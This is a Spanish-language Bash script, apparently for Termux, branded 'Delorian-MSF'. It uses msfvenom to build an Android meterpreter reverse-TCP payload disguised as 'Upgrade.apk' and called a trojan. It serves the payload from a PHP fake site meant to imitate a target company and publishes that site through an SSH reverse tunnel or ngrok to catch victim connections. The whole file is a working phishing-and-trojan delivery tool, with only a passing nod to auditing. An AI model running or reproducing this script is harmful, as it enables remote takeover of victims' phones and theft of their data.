#! /bin/bash
python2 carga.py

clear
echo ""
setterm -foreground red
echo "              -h-                        -                      "
echo "             dMMy      ::               :N-                     "
echo "             MMMm .:+shMNy+-./ohNd+:.  /NM/                     "
echo "            .MMMmdNMMMMMMMh/-yMMMMMMNdsyMM+                     "
echo "             NMM+yMMMMMMMm/+o:dMMMMMMMNoNM+                     "
echo "             yMm-dNMNNmNNMMMMdhmNMMMm/ dM+                      "
echo "             +MN-  :++/oNMMMMMMh/+oo/-  hM/                     "
echo "              dMm/::hmNMMNMMMMMMNmho-../hm                      "
echo "              /MMMMNmMMMmdmmmmmNMMNNNmmMM:                      "
echo "        -+ydmo.dMMMMMMmhy/---:ohdNMMMMMMm:hmhs/-                "
echo "   ./shmNMMMMMd+dMMMMMms-.-.-..:hmMMMMMddNMMMMMNdy+:            "
echo "   :hNMMMMMMMMMNNMMNMMNo-.-----/dNMNNMMNMMMMMMMMMMNs            "
echo "    -sMMMMMmyys+dMMNmMNNhyo+oydNmhNmNNMsoyyyNMMMMN+             "
echo "     :dNs::o. :dNMMNNmNmhhyyhyyydmNNMMMNy.:o:/hMo-              "
echo "      +do-.ym+NMMMMd. :mNmmddmNNs. /MMMMMhsN/ /hh.              "
echo "       -ddmMMNNMMMMM/ :hMMMMMMMNs. hMMMMMdMMNdds                "
echo "        ..yMMMMMMMMd+ -mMMMdNMMMs  yNMMMMMMMM-.                 "
echo "            .mMMMdy/.   {Demo{}}{}  -ohNMMMs                "
echo ""
setterm -foreground yellow
echo "               ... AVISO DESEGURIDAD ..."
echo ""
echo "     Este script usa como base a Metasploit-Framework"
echo "                PHP SERVER Y TUNNEL"
sleep 1
echo ""
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
echo ""
setterm -foreground white
echo "                 ediccion de payload MSF:  "
echo ""
echo -n "lhost :"
read lhost
echo -n "lport :"
read lport
echo -n "puerto :"
read puerto
sleep 2
echo ""
setterm -foreground red
echo "[~]Creando troyano por favor espere ..."
echo ""
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > Upgrade.apk
echo ""
setterm -foreground green
echo ""
echo "  Puedes editar el index.html  a la empresa que estas auditando"                                                                        
echo "  para tener mejores resultados."
echo "  sitio falso: http://localhost:$puerto"                                   
echo "  Troyano: Upgrade.apk"
echo "  Aca podras ver el trafico que esta pasando en tu servidor,"
echo "  solo espera las conexiones."                                               
echo ""
echo ""
setterm -foreground white
while :
do                                                                          
echo -e "\e[1;31m-----------------------------------------\e[0m"
echo -e "\e[1;31m|\e[0m   \e[1;32m1)\e[0m\e[1;37mTunnel SSH\e[0m            \e[1;32m2)\e[0m\e[1;37mNgrok\e[0m     \e[1;31m|\e[0m"
echo -e "\e[1;31m-----------------------------------------\e[0m"
echo ""
setterm -foreground green
echo -n "Delorian > "
read tunel
case $tunel in
1)
setterm -foreground cyan
#! /bin/bash
rm /data/data/com.termux/files/home/Delorian-MSF/carpetas/Upgrade.apk
cd /data/data/com.termux/files/home/Delorian-MSF
mv Upgrade.apk carpetas
cd /data/data/com.termux/files/home/Delorian-MSF/carpetas
echo "--------------------------------------------------------------------"
php -S localhost:$puerto & ssh -R 80:localhost:$puerto nokey@localhost.run -y
exit
;;
2)
rm /data/data/com.termux/files/home/Delorian-MSF/carpetas/Upgrade.apk
cd /data/data/com.termux/files/home/Delorian-MSF
mv Upgrade.apk carpetas
cd /data/data/com.termux/files/home/Delorian-MSF/carpetas
#! /bin/bash
echo ""
echo -e "\e[1;32m[\e[0m\e[1;37m~\e[0m\e[1;32m]\e[0m\e[1;36mCargando link de ngrok ...\e[0m"
sleep 4
php -S localhost:$puerto & ngrok http $puerto
exit
;;
esac
done
